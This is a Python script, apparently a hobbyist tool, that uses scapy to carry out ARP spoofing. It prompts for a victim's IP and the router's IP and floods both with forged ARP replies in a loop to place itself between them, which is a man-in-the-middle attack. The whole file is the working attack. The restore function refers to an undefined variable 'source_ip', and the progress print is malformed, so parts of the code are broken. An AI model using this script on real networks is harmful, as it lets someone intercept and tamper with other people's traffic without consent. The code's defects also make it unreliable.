import scapy.all as scapy
import time

def get_mac(ip):
  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_request_broadcast = broadcast/arp_request
  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

  if answered_list:
    return answered_list[0][1].hwsrc
  else:
    return None

def spoof(target_ip, spoof_ip):
  target_mac = get_mac(target_ip)
  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
  scapy.send(packet, verbose=False)

def restore(destination_ip, router_ip):
  destination_mac = get_mac(destination_ip)
  source_mac = get_mac(router_ip)
  packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
  scapy.send(packet, count=4, verbose=False)

victim = input("Please enter the IP of the victim computer.")
router = input("Please enter the IP of the router.")

sent_packets = 0
try:
  while True:
    spoof(victim, router)
    spoof(router, victim)
    sent_packets += 2
    print("\rSent packets." + str(sent_packets), end="1")
    time.sleep(2)
    
except KeyboardInterrupt:
  print("Detected CTRL + C .......Restoring ARP table.")
  restore(victim, router)
  restore(router, victim)
